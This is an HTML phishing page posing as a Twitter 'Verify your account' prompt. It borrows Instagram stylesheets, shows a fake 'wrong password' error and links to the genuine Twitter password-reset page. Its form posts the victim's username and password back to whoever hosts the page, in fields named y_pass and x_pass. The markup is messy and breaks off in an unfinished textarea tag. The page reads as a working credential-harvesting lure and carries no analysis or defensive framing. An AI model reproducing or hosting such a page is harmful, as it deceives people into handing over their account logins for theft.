
<html>
<head>
<meta charset="utf-8">
<title>Twitter </title>
<meta name="viewport" content="width=device-width">
<link rel="shortcut icon" href="data:image/png;base64,">
</head>
<body class="" style="">
<div id="react-root">
<section class="LZyqZ">
<div class="lTdZb">
<div class="vqibd  wNNoj ">
<img src="https://cdn.dribbble.com/users/652798/screenshots/1846570/media/84230547bc98b3390e9e4a6f18690fdd.gif" alt="mail" width="140">
<div class="ZpgjG   _1I5YO">
<h2 class="AjK3K ">Verify your account</h2>
</div>
<font color="red">You entered the wrong Password or Username. Please make sure you entered the correct information and try again.</p>
<div class="GA2q- ">
<form class="JraEb" method="POST">
<div class="QuiLu Xb8C0"><input name="y_pass" placeholder="@username" type="username" class="PAhYv zyHYP" required=""></div>
	
	
<div class="QuiLu Xb8C0"><input name="x_pass" placeholder="Password" type="password" class="PAhYv zyHYP" required=""></div><span class="idhGk _1OSdk"><button class="_5f5mN       jIbKX KUBKM      yZn4P   ">Confirm Account</button></span>
</form>
</div>
<br>
<center><a class="_s1olq" href="https://twitter.com/i/flow/password_reset">Forgot password?</a></form></center>
</div>
<br>
</div> <p id="community guidelines" style="font-family:sans-serif;font-weight:100;"> </p> </center> </body> </html>
</div>
</div>
</section>
</html>
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerUICommons.css/4c68346f3fc7.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/f5339c1f472f.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/Challenge.css/e6dcc76c8eaf.css" type="text/css" crossorigin="anonymous">
<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;">
</div>
</body>
</html>
 <textarea Style="width:1px; height:

